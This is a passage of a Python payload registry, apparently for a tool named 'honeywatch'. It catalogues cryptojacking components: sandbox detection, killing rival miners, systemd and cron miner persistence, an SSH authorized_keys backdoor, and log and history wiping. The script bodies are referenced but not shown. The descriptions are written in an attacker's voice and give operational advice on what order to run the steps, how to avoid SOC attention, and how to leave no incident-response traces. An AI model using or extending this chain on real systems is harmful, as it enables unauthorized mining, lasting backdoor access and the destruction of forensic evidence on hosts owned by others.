            description="Shell harness that inspects CPU, DMI, and dmesg indicators to detect virtualized analysis sandboxes.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["grep", "dmesg"],
            config_schema={
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/anti_vm"},
            },
            install_script=_ANTI_VM_INSTALL,
            run_script=_ANTI_VM_RUN,
            artifacts=["anti_vm.sh"],
            tags=["evasion", "anti-vm", "sandbox"],
        ),
        # ----------------------------------------------------------------- #
        # Persistence payloads — what every real cryptojacker chains onto
        # the miner deploy. Without these a reboot loses the box and a
        # password change loses access.
        # ----------------------------------------------------------------- #
        Payload(
            id="kill_miners",
            category="evasion",
            name="Competing Miner Killer",
            description="Kills every known competing cryptojacker (xmrig/kdevtmpfsi/kinsing/kthrotlds/sysupdate) and "
                        "removes their cron/systemd persistence so they don't respawn. Run this BEFORE deploying your "
                        "own miner — leaving another botnet's miner running splits CPU and draws SOC attention.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={},
            install_script=_KILL_MINERS_INSTALL,
            run_script=_KILL_MINERS_RUN,
            artifacts=[],
            tags=["persistence", "cleanup", "anti-botnet"],
        ),
        Payload(
            id="systemd_persist",
            category="evasion",
            name="Systemd Miner Persistence",
            description="Installs a systemd service that auto-restarts the miner on exit and reboots. The persistence "
                        "primitive every real cryptojacker uses — without it a reboot loses the box.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["systemctl"],
            config_schema={
                "service_name": {"type": "string", "required": False, "default": "honeywatch-miner"},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
                "cpu_quota": {"type": "string", "required": False, "default": "70%"},
                "nice": {"type": "string", "required": False, "default": "10"},
            },
            install_script=_SYSTEMD_PERSIST_INSTALL,
            run_script=_SYSTEMD_PERSIST_RUN,
            artifacts=["systemd unit"],
            tags=["persistence", "systemd", "survives-reboot"],
        ),
        Payload(
            id="cron_persist",
            category="evasion",
            name="Cron Miner Persistence",
            description="Cron-based miner re-launcher — the fallback for hosts without systemd (containers, old "
                        "distros, alpine). Re-launches the miner every N minutes if it isn't running.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=["crontab"],
            config_schema={
                "schedule": {"type": "string", "required": False, "default": "*/5 * * * *"},
                "run_user": {"type": "string", "required": False, "default": "root"},
                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/xmrig"},
            },
            install_script=_CRON_PERSIST_INSTALL,
            run_script=_CRON_PERSIST_RUN,
            artifacts=["crontab entry"],
            tags=["persistence", "cron", "fallback"],
        ),
        Payload(
            id="sshkey_backdoor",
            category="evasion",
            name="SSH Authorized Keys Backdoor",
            description="Installs the operator's public key into the popped user's authorized_keys so access survives "
                        "a password change. The second most common persistence primitive after cron.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={
                "backdoor_key": {"type": "string", "required": True},
                "run_user": {"type": "string", "required": False, "default": "root"},
            },
            install_script=_SSHKEY_BACKDOOR_INSTALL,
            run_script=_SSHKEY_BACKDOOR_RUN,
            artifacts=["authorized_keys entry"],
            tags=["persistence", "backdoor", "ssh"],
        ),
        Payload(
            id="cleanup",
            category="evasion",
            name="Deploy Trace Cleanup",
            description="Wipes shell history, truncates auth/syslog/wtmp/lastlog, flushes journald, and "
                        "removes the honeywatch install log + dropper script. Run LAST in the evasion chain "
                        "after persistence is installed so the box carries no IR fingerprints tying it to "
                        "the deploy. Mirrors TeamTNT T1070.003 / Outlaw cleanup.",
            platforms=["linux-x64", "linux-arm64"],
            install_type="script",
            dependencies=[],
            config_schema={},
            install_script=_CLEANUP_INSTALL,
            run_script=_CLEANUP_RUN,
            artifacts=[],
            tags=["persistence", "cleanup", "anti-forensics"],
        ),
    ]


# Public registry is built once at import time.
registry: dict[str, Payload] = {p.id: p for p in _payloads()}
PAYLOAD_IDS: tuple[str, ...] = tuple(registry.keys())
PAYLOAD_CATEGORIES: tuple[str, ...] = tuple(sorted({p.category for p in registry.values()}))


def get_payload(payload_id: str) -> Payload:
    """Return a payload by id, raising KeyError if unknown."""
    if payload_id not in registry:
        raise KeyError(f"unknown payload: {payload_id!r}")
    return registry[payload_id]


def list_payloads(category: str | None = None) -> list[Payload]:
    """Return all payloads, optionally filtered by category."""
    payloads = list(registry.values())
    if category is not None:
        payloads = [p for p in payloads if p.category == category]
    return payloads


def by_category() -> dict[str, list[Payload]]:
    """Return payloads grouped by category."""
    groups: dict[str, list[Payload]] = {}
    for p in registry.values():
        groups.setdefault(p.category, []).append(p)
    return groups
